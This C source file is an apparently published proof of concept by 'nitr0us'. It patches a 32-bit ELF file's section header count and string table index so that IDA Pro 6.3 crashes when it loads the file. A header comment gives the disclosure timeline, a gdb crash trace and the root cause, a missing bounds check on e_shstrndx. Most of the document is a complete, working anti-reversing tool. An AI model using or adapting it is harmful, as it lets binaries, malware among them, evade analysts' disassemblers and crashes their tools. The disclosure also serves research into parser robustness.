/*
*
* IDA Pro 6.3 (crash due an internal error)
* ELF anti-debugging/reversing patcher
*
* - nitr0us [ http://twitter.com/nitr0usmx ]
*
* Tested under:
* IDA Pro Starter License 6.3.120531 (Mac OS X)
* IDA Pro Demo            6.3.120730 (Ubuntu Linux 9.04)
* IDA Pro Demo            6.3.120730 (Mac OS X 10.7.3)
* IDA Pro Demo            6.3.120730 (Windows Vista Home Premium SP2)
*
* Bug found using Frixyon fuzzer (my ELF file format fuzzer still in development)
*
* Timeline:
* 21/11/2012	The bug was found on IDA Demo 6.3
* 22/11/2012	The bug was tested on IDA Pro Starter License 6.3.120531 (32-bit) 
* 22/11/2012	The bug was reported through the official Hex-Rays contact emails
* 23/11/2012	Hex-Rays replied and agreed that the bug leads to an unrecoverable 
*               state and it will be fixed on the next release
*
**************** TECHNICAL DETAILS ***********************
nitr0us@burial:~$ gdb -q idaq
(gdb) r a.out
(no debugging symbols found)

Program received signal SIGTRAP, Trace/breakpoint trap.
[Switching to Thread 0xb6860760 (LWP 3638)]
0xb55f7694 in default_notification_handler (reader=@0xbfbffae0,
    notif=reader_t::err_shstrndx) at reader.cpp:33
33      reader.cpp: No such file or directory.
        in reader.cpp
Current language:  auto; currently c++
(gdb)

The root cause of the problem is that there's no validation to
verify if e_shstrndx > e_shnum before referencing it.

**********************************************************
*
* [Compilation] $ gcc ida_63_elf_shield.c -o ida_63_elf_shield -Wall
*
* http://chatsubo-labs.blogspot.com
* http://www.brainoverflow.org
*
*/

#include <sys/mman.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
#include <time.h>

#define EI_NIDENT       16
#define ELFCLASS32      1               /* 32-bit objects */
#define ELFDATA2LSB     1               /* 2's complement, little endian */

const char e_magic[4] = { 0x7f, 'E', 'L', 'F' };

typedef uint16_t Elf32_Half;
typedef uint32_t Elf32_Word;
typedef uint32_t Elf32_Addr;
typedef uint32_t Elf32_Off;

typedef struct
{
  unsigned char e_ident[EI_NIDENT];     /* Magic number and other info */
  Elf32_Half    e_type;                 /* Object file type */
  Elf32_Half    e_machine;              /* Architecture */
  Elf32_Word    e_version;              /* Object file version */
  Elf32_Addr    e_entry;                /* Entry point virtual address */
  Elf32_Off     e_phoff;                /* Program header table file offset */
  Elf32_Off     e_shoff;                /* Section header table file offset */
  Elf32_Word    e_flags;                /* Processor-specific flags */
  Elf32_Half    e_ehsize;               /* ELF header size in bytes */
  Elf32_Half    e_phentsize;            /* Program header table entry size */
  Elf32_Half    e_phnum;                /* Program header table entry count */
  Elf32_Half    e_shentsize;            /* Section header table entry size */
  Elf32_Half    e_shnum;                /* Section header table entry count */
  Elf32_Half    e_shstrndx;             /* Section header string table index */
} Elf32_Ehdr;

int isELF(int fd);

int main(int argc, char **argv)
{
	Elf32_Ehdr	*header;
	Elf32_Half	new_shnum;
	Elf32_Half	new_shstrndx;
	int		fd;

	printf("######################################################\n");
	printf("#                                                    #\n");
	printf("# IDA Pro 6.3 - ELF anti-debugging/reversing patcher #\n");
	printf("#                      -nitr0us-                     #\n");
	printf("#                                                    #\n");
	printf("######################################################\n\n");

	if(argc < 2){
		fprintf(stderr, "Usage: %s <elf_file_to_patch>\n", argv[0]);
		exit(-1);
	}

	if((fd = open(argv[1], O_RDWR)) == -1){
		perror("open");
		exit(-1);
	}

	if(!isELF(fd)){
		close(fd);
		exit(-1);
	}

	// Mapping to memory only the necessary bytes [sizeof(header)]
	if((header = (Elf32_Ehdr *) mmap(NULL, sizeof(header), PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)) == MAP_FAILED){
		perror("mmap");
		close(fd);
		exit(-1);
	}

	printf("[*] The ELF file originally has:\n");
	printf("[-] Ehdr->e_shnum:    %5d (0x%.4x)\n", header->e_shnum, header->e_shnum);
	printf("[-] Ehdr->e_shstrndx: %5d (0x%.4x)\n\n", header->e_shstrndx, header->e_shstrndx);

	printf("[*] Patching \"%s\" with new random() values...\n\n", argv[1]);

	srand(time(NULL)); // seed for rand()

	new_shnum    = (Elf32_Half) rand() % 0x1337;
	new_shstrndx = (Elf32_Half) 0;

	while(new_shstrndx < new_shnum)
		new_shstrndx = (Elf32_Half) rand() % 0xDEAD;

	header->e_shnum    = new_shnum;
	header->e_shstrndx = new_shstrndx;

	// Synchronize the ELF in file system with the previous memory mapped
	if(msync(NULL, 0, MS_SYNC) == -1){
		perror("msync");
		close(fd);
		exit(-1);
	}

	close(fd);
	munmap(header, 0);

	printf("[*] The patched ELF file now has:\n");
	printf("[+] Ehdr->e_shnum:    %5d (0x%.4x)\n", new_shnum, new_shnum);
	printf("[+] Ehdr->e_shstrndx: %5d (0x%.4x)\n\n", new_shstrndx, new_shstrndx);

	printf("[*] IDA Pro 6.3 should crash trying to load \"%s\"\n", argv[1]);

	return 0;
}

int isELF(int fd)
{
	Elf32_Ehdr	header;

	if(read(fd, &header, sizeof(header)) == -1){
		perror("isELF(): read");
		return 0;
	}

	/* magic number verification */
	if(memcmp(header.e_ident, e_magic, 4) != 0){
		fprintf(stderr, "The argument given is not an ELF file !\n");
		return 0;
	}

	/* 32-bit class verification */
	if(header.e_ident[4] != ELFCLASS32){
		fprintf(stderr, "Only 32-bit ELF files supported !\n");
		return 0;
	}

	/* little-endian verification */
	if(header.e_ident[5] != ELFDATA2LSB){
		fprintf(stderr, "Only little-endian ELF files supported !\n");
		return 0;
	}

	return 1;
}
